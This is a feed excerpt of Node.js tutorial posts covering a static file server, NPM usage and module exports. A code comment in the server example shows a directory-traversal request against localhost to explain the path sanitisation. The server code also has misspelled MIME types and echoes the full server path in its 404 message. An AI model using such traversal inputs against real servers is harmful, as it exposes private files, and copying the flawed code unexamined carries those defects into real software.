<h1 id="Node-js-HTTP-static-file-server-with-ES6">Node.js HTTP static file server with ES6+<a href="#Node-js-HTTP-static-file-server-with-ES6" class="headerlink" title="Node.js HTTP static file server with ES6+"></a></h1><p>Let‚Äôs now proceed to do the static web server. We want to parse the URL path and get the file matching that path. For instance, if we get a request like <code>localhost:9000/example/server.js</code>. We want to look for a file in <code>./example/server.js</code>.</p>
<p>Browsers don‚Äôt rely on the extension to render a file. Instead, they use the header <code>Content-type</code>. For instance, if we serve an HTML file with a content type <code>text/plain</code> it will show the HTML code (plain text). But, if you use a content type <code>text/html</code> then it will render the HTML as such.</p>
<p>For now, we can infer the file content type based on the file extension. The content types are represented in MIME formmat. MIME stands for Multipurpose Internet Mail Extensions. You can see the MIME types according to file extentions in the following code:</p>
<figure class="highlight javascript"><figcaption><span>static_server.js</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> http = <span class="built_in">require</span>(<span class="string">'http'</span>);</span><br><span class="line"><span class="keyword">const</span> url = <span class="built_in">require</span>(<span class="string">'url'</span>);</span><br><span class="line"><span class="keyword">const</span> fs = <span class="built_in">require</span>(<span class="string">'fs'</span>);</span><br><span class="line"><span class="keyword">const</span> path = <span class="built_in">require</span>(<span class="string">'path'</span>);</span><br><span class="line"><span class="comment">// you can pass the parameter in the command line. e.g. node static_server.js 3000</span></span><br><span class="line"><span class="keyword">const</span> port = process.argv[<span class="number">2</span>] || <span class="number">9000</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// maps file extention to MIME types</span></span><br><span class="line"><span class="keyword">const</span> mimeType = &#123;</span><br><span class="line">  <span class="string">'.ico'</span>: <span class="string">'image/x-icon'</span>,</span><br><span class="line">  <span class="string">'.html'</span>: <span class="string">'text/html'</span>,</span><br><span class="line">  <span class="string">'.js'</span>: <span class="string">'text/javascript'</span>,</span><br><span class="line">  <span class="string">'.json'</span>: <span class="string">'application/json'</span>,</span><br><span class="line">  <span class="string">'.css'</span>: <span class="string">'text/css'</span>,</span><br><span class="line">  <span class="string">'.png'</span>: <span class="string">'image/png'</span>,</span><br><span class="line">  <span class="string">'.jpg'</span>: <span class="string">'image/jpeg'</span>,</span><br><span class="line">  <span class="string">'.wav'</span>: <span class="string">'audio/wav'</span>,</span><br><span class="line">  <span class="string">'.mp3'</span>: <span class="string">'audio/mpeg'</span>,</span><br><span class="line">  <span class="string">'.svg'</span>: <span class="string">'image/svg+xml'</span>,</span><br><span class="line">  <span class="string">'.pdf'</span>: <span class="string">'application/pdf'</span>,</span><br><span class="line">  <span class="string">'.doc'</span>: <span class="string">'application/msword'</span>,</span><br><span class="line">  <span class="string">'.eot'</span>: <span class="string">'appliaction/vnd.ms-fontobject'</span>,</span><br><span class="line">  <span class="string">'.ttf'</span>: <span class="string">'aplication/font-sfnt'</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">http.createServer(<span class="function"><span class="keyword">function</span> (<span class="params">req, res</span>) </span>&#123;</span><br><span class="line">  <span class="built_in">console</span>.log(<span class="string">`<span class="subst">$&#123;req.method&#125;</span> <span class="subst">$&#123;req.url&#125;</span>`</span>);</span><br><span class="line"></span><br><span class="line">  <span class="comment">// parse URL</span></span><br><span class="line">  <span class="keyword">const</span> parsedUrl = url.parse(req.url);</span><br><span class="line"></span><br><span class="line">  <span class="comment">// extract URL path</span></span><br><span class="line">  <span class="comment">// Avoid https://en.wikipedia.org/wiki/Directory_traversal_attack</span></span><br><span class="line">  <span class="comment">// e.g curl --path-as-is http://localhost:9000/../fileInDanger.txt</span></span><br><span class="line">  <span class="comment">// by limiting the path to current directory only</span></span><br><span class="line">  <span class="keyword">const</span> sanitizePath = path.normalize(parsedUrl.pathname).replace(<span class="regexp">/^(\.\.[\/\\])+/</span>, <span class="string">''</span>);</span><br><span class="line">  <span class="keyword">let</span> pathname = path.join(__dirname, sanitizePath);</span><br><span class="line"></span><br><span class="line">  fs.exists(pathname, <span class="function"><span class="keyword">function</span> (<span class="params">exist</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(!exist) &#123;</span><br><span class="line">      <span class="comment">// if the file is not found, return 404</span></span><br><span class="line">      res.statusCode = <span class="number">404</span>;</span><br><span class="line">      res.end(<span class="string">`File <span class="subst">$&#123;pathname&#125;</span> not found!`</span>);</span><br><span class="line">      <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// if is a directory, then look for index.html</span></span><br><span class="line">    <span class="keyword">if</span> (fs.statSync(pathname).isDirectory()) &#123;</span><br><span class="line">      pathname += <span class="string">'/index.html'</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// read file from file system</span></span><br><span class="line">    fs.readFile(pathname, <span class="function"><span class="keyword">function</span>(<span class="params">err, data</span>)</span>&#123;</span><br><span class="line">      <span class="keyword">if</span>(err)&#123;</span><br><span class="line">        res.statusCode = <span class="number">500</span>;</span><br><span class="line">        res.end(<span class="string">`Error getting the file: <span class="subst">$&#123;err&#125;</span>.`</span>);</span><br><span class="line">      &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="comment">// based on the URL path, extract the file extention. e.g. .js, .doc, ...</span></span><br><span class="line">        <span class="keyword">const</span> ext = path.parse(pathname).ext;</span><br><span class="line">        <span class="comment">// if the file is found, set Content-type and send data</span></span><br><span class="line">        res.setHeader(<span class="string">'Content-type'</span>, mimeType[ext] || <span class="string">'text/plain'</span> );</span><br><span class="line">        res.end(data);</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;);</span><br><span class="line">  &#125;);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&#125;).listen(<span class="built_in">parseInt</span>(port));</span><br><span class="line"></span><br><span class="line"><span class="built_in">console</span>.log(<span class="string">`Server listening on port <span class="subst">$&#123;port&#125;</span>`</span>);</span><br></pre></td></tr></table></figure>
<p>We are using Node.js core <code>path.parse</code> libraries to get the extensions from the URL path.   Similarly, we are using <code>url.parse</code> to break down the <code>request.url</code> into its components. Then, we extract the extension from the file. Finally, we use <code>fs.readFile</code> to get the content from the file system. If any error occurs related to the file path, we return a 404 and otherwise return the file content.</p>
<p>Give it a try with:</p>
<figure class="highlight bash"><figcaption><span>Command lines to test the server</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># run server</span></span><br><span class="line">node server.js</span><br><span class="line"></span><br><span class="line"><span class="comment"># get the javascript file with</span></span><br><span class="line">curl -i localhost:9000/server.js</span><br><span class="line"></span><br><span class="line"><span class="comment"># testing with non-existing file</span></span><br><span class="line">curl -i localhost:9000/invalid-file.doc</span><br></pre></td></tr></table></figure>
<p>For the first one, you will get a 200 OK response, while for the 2nd one you will get a 404 not found error, as expected.</p>
<p>You can also download the code from this repo and try out with the test files:</p>
<figure class="highlight bash"><figcaption><span>Testing with different file types</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># Get Repository</span></span><br><span class="line">git <span class="built_in">clone</span> https://github.com/amejiarosario/meanshop.git</span><br><span class="line"><span class="built_in">cd</span> meanshop</span><br><span class="line"><span class="comment"># Load the specific version</span></span><br><span class="line">git checkout static-server</span><br><span class="line"></span><br><span class="line"><span class="comment"># start the server (requires Node 4+)</span></span><br><span class="line">npm start</span><br><span class="line"></span><br><span class="line"><span class="comment"># test it in your browser with the following paths:</span></span><br><span class="line">open http://localhost:9000/</span><br><span class="line">open http://localhost:9000/index.html</span><br><span class="line">open http://localhost:9000/<span class="built_in">test</span>/meanshop-book.png</span><br></pre></td></tr></table></figure>
<h1 id="Summary">Summary<a href="#Summary" class="headerlink" title="Summary"></a></h1><p>In this post, we went through the basics about <code>http</code> module to create a server. We talk about the MIME types and how the help the browser to render properly. Finally, we put all together to accomplish our static file server with Node.js!</p>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;We are going to do a &lt;strong&gt;static file server&lt;/strong&gt; in Node.js. This web server is going to respond with the content of the file in a given path. While we are doing this exercise we are going to cover more about &lt;code&gt;http&lt;/code&gt; module. Also, use some utilities from other core modules such as &lt;code&gt;path&lt;/code&gt;, &lt;code&gt;url&lt;/code&gt; and &lt;code&gt;fs&lt;/code&gt;.&lt;/p&gt;
    
    </summary>
    
      <category term="Programming" scheme="https://adrianmejia.com/categories/Programming/"/>
    
      <category term="Web Development" scheme="https://adrianmejia.com/categories/Programming/Web-Development/"/>
    
    
      <category term="javascript" scheme="https://adrianmejia.com/tags/javascript/"/>
    
      <category term="nodejs" scheme="https://adrianmejia.com/tags/nodejs/"/>
    
  </entry>
  
  <entry>
    <title>Node Package Manager (NPM) Tutorial</title>
    <link href="https://adrianmejia.com/blog/2016/08/19/Node-Package-Manager-NPM-Tutorial/"/>
    <id>https://adrianmejia.com/blog/2016/08/19/Node-Package-Manager-NPM-Tutorial/</id>
    <published>2016-08-19T20:18:32.000Z</published>
    <updated>2016-08-19T20:18:32.000Z</updated>
    
    <content type="html"><![CDATA[<p>This tutorial goes from how to install NPM to manage packages dependencies. While we are doing this, we will use practical examples to drive the concepts home.</p>
<a id="more"></a>
<p>Node Package Manager (NPM) is a CLI tool to manage dependencies. It also allows you to publish packages to the NPM website and find new modules.</p>
<p>In this section, we are going to get hands on NPM. We will cover from how to install it to how to download, uninstall and manage packages. While we are doing this we will use practical examples to drive the concepts home.</p>
<h1 id="How-to-install-update-NPM">How to install/update NPM?<a href="#How-to-install-update-NPM" class="headerlink" title="How to install/update NPM?"></a></h1><p><abbr title="Node Package Manager">NPM</abbr> is bundle into the Node installation. So, if you have Node, then you have <abbr title="Node Package Manager">NPM</abbr> already. But, <abbr title="Node Package Manager">NPM</abbr> gets updated more often than Node. So, from time to time you need to get the latest version.</p>
<p>You can check the NPM version and install latest  by running:</p>
<figure class="highlight bash"><figcaption><span>Installing NPM</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># get version</span></span><br><span class="line">npm -v</span><br><span class="line"></span><br><span class="line"><span class="comment"># update NPM to latest and greatest</span></span><br><span class="line">npm install -g npm</span><br></pre></td></tr></table></figure>
<p>You can also use the shortcut for <code>npm install</code> like <code>npm i</code>.</p>
<h1 id="How-to-start-a-NodeJs-project">How to start a NodeJs project?<a href="#How-to-start-a-NodeJs-project" class="headerlink" title="How to start a NodeJs project?"></a></h1><p>Node projects and packages use a special file called <code>package.json</code>. It contains dependencies and more information to run the project. Let‚Äôs start by creating that using the <code>npm init</code> command. We are going to call our project <code>meanshop2</code>, but call it whatever you want ;)</p>
<figure class="highlight bash"><figcaption><span>initializing a Node project/package</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">mkdir meanshop2 &amp;&amp; <span class="built_in">cd</span> meanshop2</span><br><span class="line">npm init --yes</span><br></pre></td></tr></table></figure>
<p>This set of commands created a new folder called <code>meanshop2</code>. The <code>init</code> command will create <code>package.json</code> file for us. The <code>--yes</code> option go with the defaults. Otherwise, it will ask us to fill out every property in package.json.</p>
<figure class="highlight javascript"><figcaption><span>package.json</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">  <span class="string">"name"</span>: <span class="string">"meanshop2"</span>,</span><br><span class="line">  <span class="string">"version"</span>: <span class="string">"1.0.0"</span>,</span><br><span class="line">  <span class="string">"description"</span>: <span class="string">""</span>,</span><br><span class="line">  <span class="string">"main"</span>: <span class="string">"index.js"</span>,</span><br><span class="line">  <span class="string">"scripts"</span>: &#123;</span><br><span class="line">    <span class="string">"test"</span>: <span class="string">"echo \"Error: no test specified\" &amp;&amp; exit 1"</span></span><br><span class="line">  &#125;,</span><br><span class="line">  <span class="string">"keywords"</span>: [],</span><br><span class="line">  <span class="string">"author"</span>: <span class="string">""</span>,</span><br><span class="line">  <span class="string">"license"</span>: <span class="string">"ISC"</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>Feel free to edit any of the properties values, such as author, description. Notice, that version starts with <code>1.0.0</code>. We are going to talk more about versioning later on this tutorial.</p>
<h1 id="How-to-download-NPM-packages">How to download NPM packages?<a href="#How-to-download-NPM-packages" class="headerlink" title="How to download NPM packages?"></a></h1><p>You can download <abbr title="Node Package Manager">NPM</abbr> packages using <code>npm install &lt;package_name&gt;</code>. By default, npm will grap the latest version, but you can also expecify an exact verision.</p>
<p>Let‚Äôs install two packages <code>lodash</code> and <code>express</code> as follows:</p>
<figure class="highlight bash"><figcaption><span>Installing NPM packages</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># install latest and save on package.json</span></span><br><span class="line">npm install lodash --save</span><br><span class="line"></span><br><span class="line"><span class="comment"># install specific version and save dep on package.json</span></span><br><span class="line">npm install express@4.14.0 --save</span><br></pre></td></tr></table></figure>
<p><code>npm install</code> is going to create a new folder called <code>node_modules</code>. This is where all the dependencies live.</p>
<p>Notice that for the second package we are specifying the exact version. You can use the <code>@</code> symbol and then the version number.</p>
<p>Go to your <code>package.json</code> and verify that they both are listed as dependencies. You can install all the dependencies by running this command:</p>
<figure class="highlight bash"><figcaption><span>Install all dependencies from a package.json</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">npm install</span><br></pre></td></tr></table></figure>
<p><abbr title="Node Package Manager">NPM</abbr> will add packages to dependencies if you use the <code>--save</code> flag. Otherwise <code>npm</code> won‚Äôt include it. To automate the process you can run:</p>
<figure class="highlight bash"><figcaption><span>Smarter NPM's defaults</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">npm config <span class="built_in">set</span> save=<span class="literal">true</span></span><br><span class="line">npm config <span class="built_in">set</span> save-exact=<span class="literal">true</span></span><br></pre></td></tr></table></figure>
<p>The <code>save=true</code> will make that the packages get auto-installed. <code>save-exact=true</code> will lock the current version and prevent automatic updates and break the project.</p>
<p>To sum up, here are the commands</p>
<figure class="highlight bash"><figcaption><span>NPM install commands</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># install a package globally</span></span><br><span class="line">npm install -g &lt;package_name&gt;</span><br><span class="line"></span><br><span class="line"><span class="comment"># install a package locally (node_modules)</span></span><br><span class="line">npm install &lt;package_name&gt;</span><br><span class="line"></span><br><span class="line"><span class="comment"># install a package locally and save it as dependency (package.json)</span></span><br><span class="line">npm install &lt;package_name&gt; --save-dev</span><br><span class="line"></span><br><span class="line"><span class="comment"># install package locally, save it as dependency with the exact version</span></span><br><span class="line">npm install &lt;package_name&gt; --save   --save-exact</span><br><span class="line"></span><br><span class="line"><span class="comment"># install all dependencies listed on package.json</span></span><br><span class="line">npm install</span><br></pre></td></tr></table></figure>
<p>Usually, you use <code>--save-dev</code> vs <code>--save</code> when you need use package that is not part of the project. For instance, testing libraries, building assets tools, etc.</p>
<p>You can search for all NPM modules on <a href="https://www.npmjs.com/browse/star" target="_blank" rel="noopener">npmjs.com</a></p>
<h1 id="How-to-view-my-installed-NPM-packages">How to view my installed NPM packages?<a href="#How-to-view-my-installed-NPM-packages" class="headerlink" title="How to view my installed NPM packages?"></a></h1><p>Sometimes is useful to see the list of packages that you have installed on your system. You can do that with the following commands:</p>
<figure class="highlight bash"><figcaption><span>List packages</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># list all installed dependencies</span></span><br><span class="line">npm ls --depth=0</span><br><span class="line"></span><br><span class="line"><span class="comment"># list all installed globally dependencies</span></span><br><span class="line">npm ls -g --depth=0</span><br></pre></td></tr></table></figure>
<p>You can use <code>--depth=0</code> to prevent listing the dependencies‚Äô dependencies.</p>
<h1 id="What-is-SemVer">What is SemVer?<a href="#What-is-SemVer" class="headerlink" title="What is SemVer?"></a></h1><p>Semantic Versioning (<abbr title="Semantic Versioning">SemVer</abbr>) is versioning convention composed of three numbers: <code>Major.Minor.Patch</code> or also <code>Breaking.Feature.Patch</code>:</p>
<ul>
<li><strong>Major releases: breaking changes.</strong> Major changes that change (breaks) how the API worked before. For instance, removed functions.</li>
<li><strong>Minor releases: new features</strong>. Changes that keeps the API working as before and adds new functionality.</li>
<li><strong>Patch releases: bug fixes</strong>. Patches doesn‚Äôt add functionality nor removes/changes functionality. It‚Äôs scope only to bug fixes.</li>
</ul>
<p>You can specify on the <code>package.json</code> how packages can be updated. You can use <code>~</code> for updating patches. <code>^</code> for upgrading minor releases and <code>*</code> for major releases.</p>
<p><img src="/images/semver-major-minor-patch-breaking-feature-fix.png" alt="SemVer Breaking.Feature.Fix"></p>
<p>Like this:</p>
<ul>
<li>Patch releases: <code>~1.0.7</code>, or <code>1.0.x</code> or just <code>1.0</code>.</li>
<li>Minor releases: <code>^1.0.7</code>, or <code>1.x</code> or just <code>1</code>.</li>
<li>Major releases: <code>*</code> or <code>x</code>.</li>
</ul>
<p>As you could imagine, not all developers respect the Semantic Version rules. Try to follow the rules yourself, but don‚Äôt trust that all will do. You can have your project working well with a <code>1.0.8</code> version and all in a sudden it breaks with <code>1.0.9</code>. It happened to me before, so I prefer to use: <code>--save-exact</code>, when makes sense.</p>
<h1 id="How-to-uninstall-NPM-packages">How to uninstall NPM packages?<a href="#How-to-uninstall-NPM-packages" class="headerlink" title="How to uninstall NPM packages?"></a></h1><p>You can uninstall <abbr title="Node Package Manager">NPM</abbr> packages using the following commands:</p>
<figure class="highlight bash"><figcaption><span>Uninstalling NPM packages</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># uninstall package and leave it listed as dep</span></span><br><span class="line">npm uninstall lodash</span><br><span class="line"></span><br><span class="line"><span class="comment"># uninstall and remove from dependencies</span></span><br><span class="line">npm uninstall --save lodash</span><br><span class="line"></span><br><span class="line"><span class="comment"># uninstall global package</span></span><br><span class="line">npm uninstall -g &lt;package_name&gt;</span><br><span class="line"></span><br><span class="line"><span class="comment"># remove uninstalled packages from node_modules</span></span><br><span class="line">npm prune <span class="comment"># remove extranous</span></span><br></pre></td></tr></table></figure>
<h1 id="Summary">Summary<a href="#Summary" class="headerlink" title="Summary"></a></h1><p><abbr title="Node Package Manager">NPM</abbr> is a powerful tool. It helps us to create Node projects/modules, manage its dependencies and much more. In this section, we covered the main commands that you would most often.</p>
<p>Furthermore, we cover <abbr title="Semantic Versioning">SemVer</abbr>. It is used in many systems (Ruby Gems, etc.) not just in the Node community. SemVer is three-part number versioning system: Major.Minor.Patch. You can also think as Breaking.Feature.Patch.</p>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;This tutorial goes from how to install NPM to manage packages dependencies. While we are doing this, we will use practical examples to drive the concepts home.&lt;/p&gt;
    
    </summary>
    
      <category term="Programming" scheme="https://adrianmejia.com/categories/Programming/"/>
    
      <category term="Web Development" scheme="https://adrianmejia.com/categories/Programming/Web-Development/"/>
    
    
      <category term="javascript" scheme="https://adrianmejia.com/tags/javascript/"/>
    
      <category term="npm" scheme="https://adrianmejia.com/tags/npm/"/>
    
      <category term="nodejs" scheme="https://adrianmejia.com/tags/nodejs/"/>
    
  </entry>
  
  <entry>
    <title>Getting started with Node.js modules: require, exports, imports and beyond</title>
    <link href="https://adrianmejia.com/blog/2016/08/12/Getting-started-with-Node-js-modules-require-exports-imports-npm-and-beyond/"/>
    <id>https://adrianmejia.com/blog/2016/08/12/Getting-started-with-Node-js-modules-require-exports-imports-npm-and-beyond/</id>
    <published>2016-08-12T20:30:23.000Z</published>
    <updated>2019-01-28T21:50:23.000Z</updated>
    
    <content type="html"><![CDATA[<p>Getting started with Node.js modules: require, exports, imports and beyond.</p>
<p>Modules are a crucial concept to understand Node.js projects. In this post, we cover Node modules: <code>require</code>, <code>exports</code> and, the future <code>import</code>.</p>
<a id="more"></a>
<p>Node modules allow you to write reusable code. You can nest them one inside another. Using the Node Package Manager (NPM), you can publish your modules and make them available to the community. Also, NPM enables you to reuse modules made by other developers.</p>
<p>In this section, we are going to cover how to create Node modules and each one of its components:</p>
<ul>
<li>Require</li>
<li>Exports</li>
<li>Module.exports</li>
</ul>
<blockquote>
<p>We are using Node 10.x for the examples and ES6 syntax. However, the concepts are valid for any version.</p>
</blockquote>
<h1 id="Require">Require<a href="#Require" class="headerlink" title="Require"></a></h1><p><code>require</code> are used to consume modules. It allows you to include modules in your programs. You can add built-in core Node.js modules, community-based modules (<code>node_modules</code>) and local modules.</p>
<p>Let‚Äôs say we want to read a file from the filesystem. Node has a core module called ‚Äòfs‚Äô:</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line marked"><span class="keyword">const</span> fs = <span class="built_in">require</span>(<span class="string">'fs'</span>);</span><br><span class="line"></span><br><span class="line">fs.readFile(<span class="string">'./file.txt'</span>, <span class="string">'utf-8'</span>, (err, data) =&gt; &#123;</span><br><span class="line">  <span class="keyword">if</span>(err) &#123; <span class="keyword">throw</span> err; &#125;</span><br><span class="line">  <span class="built_in">console</span>.log(<span class="string">'data: '</span>, data);</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>
<p>As you can see, we imported the ‚Äúfs‚Äù module into our code. It allows us to use any function attached to it, like ‚ÄúreadFile‚Äù and many others.</p>
<p>The <code>require</code> function will look for files in the following order:</p>
<ol>
<li>Built-in core Node.js modules (like <code>fs</code>)</li>
<li>Modules in the <code>node_modules</code> folder.</li>
<li>If the module name has a <code>./</code>, <code>/</code> or <code>../</code>, it will look for the directory/file in the given path. It matches the file extensions: <code>*.js</code>, <code>*.json</code> and <code>*.node</code>.</li>
</ol>
<h1 id="Exports">Exports<a href="#Exports" class="headerlink" title="Exports"></a></h1><p>The <code>exports</code> keyword gives you the chance to ‚Äúexport‚Äù your own objects and methods. Let‚Äôs do an example:</p>
<figure class="highlight javascript"><figcaption><span>circle.js</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> PI = <span class="number">3.14159265359</span>;</span><br><span class="line"></span><br><span class="line">exports.area = <span class="function"><span class="params">radius</span> =&gt;</span> (radius ** <span class="number">2</span>) * PI;</span><br><span class="line">exports.circumference = <span class="function"><span class="params">radius</span> =&gt;</span> <span class="number">2</span> * radius * PI;</span><br></pre></td></tr></table></figure>
<p>In the code below, we are exporting the <code>area</code> and <code>circumference</code> functions. We defined the <code>PI</code> constant, but this is only accessible within the module. Only the elements associated with <code>exports</code> are available outside the module.</p>
<p>So, we can consume it using <code>require</code> in another file like follows:</p>
<figure class="highlight javascript"><figcaption><span>main.js</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> circle = <span class="built_in">require</span>(<span class="string">'./circle'</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> r = <span class="number">3</span>;</span><br><span class="line"><span class="built_in">console</span>.log(<span class="string">`Circle with radius <span class="subst">$&#123;r&#125;</span> has</span></span><br><span class="line"><span class="string">  area: <span class="subst">$&#123;circle.area(r)&#125;</span>;</span></span><br><span class="line"><span class="string">  circunference: <span class="subst">$&#123;circle.circumference(r)&#125;</span>`</span>);</span><br></pre></td></tr></table></figure>
<p>Noticed that this time we prefix the module name with <code>./</code>. That indicates that the module is a local file.</p>
<h1 id="Module-Wrapper">Module Wrapper<a href="#Module-Wrapper" class="headerlink" title="Module Wrapper"></a></h1><p>You can think of each Node.js module as a self-contained function like the following one:</p>
<figure class="highlight javascript"><figcaption><span>Module Wrapper</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">(<span class="function"><span class="keyword">function</span> (<span class="params">exports, require, module, __filename, __dirname</span>) </span>&#123;</span><br><span class="line">  <span class="built_in">module</span>.exports = exports = &#123;&#125;;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// Your module code ...</span></span><br><span class="line"></span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>
<p>We have already covered <code>exports</code> and <code>require</code>. Notice the relationship between <code>module.exports</code> and <code>exports</code>. They point to the same reference. But, if you assign something directly to <code>exports</code> you will break its link to <code>module.exports</code>. More on that in the next section.</p>
<p>For our convenience <code>__filename</code> and <code>__dirname</code> are defined. They provide the full path to the current file and directory. The latter excludes the filename and print out the directory path.</p>
<p>For instance, for our <code>./circle.js</code> module, it would be something like this:</p>
<ul>
<li><p><code>__filename</code>: <code>/User/adrian/code/circle.js</code></p>
</li>
<li><p><code>__dirname</code>: <code>/User/adrian/code</code></p>
</li>
</ul>
<p>Ok, we have covered <code>exports</code>, <code>require</code>, <code>__filename</code>, and <code>__dirname</code>. The only one we haven‚Äôt cover is <code>module</code>. Let‚Äôs go for it!</p>
<h1 id="Module-exports-vs-Exports">Module.exports vs Exports<a href="#Module-exports-vs-Exports" class="headerlink" title="Module.exports vs Exports"></a></h1><p>The <code>module</code> is not global; it is local for each module. It contains metadata about a module like id, exports, parent, children, and so on.</p>
<p><code>exports</code> is an alias of <code>module.exports</code>. Consequently, whatever you assign to <code>exports</code> is also available on <code>module.exports</code>. However, if you assign something directly to exports, then you lose the shortcut to <code>module.exports</code>. E.g.</p>
<figure class="highlight javascript"><figcaption><span>cat.js</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Cat</span> </span>&#123;</span><br><span class="line">  makeSound() &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="string">'Meowww'</span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// exports = Cat; // It will not work with `new Cat();`</span></span><br><span class="line"><span class="comment">// exports.Cat = Cat; // It will require `new Cat.Cat();` to work (yuck!)</span></span><br><span class="line"><span class="built_in">module</span>.exports = Cat;</span><br></pre></td></tr></table></figure>
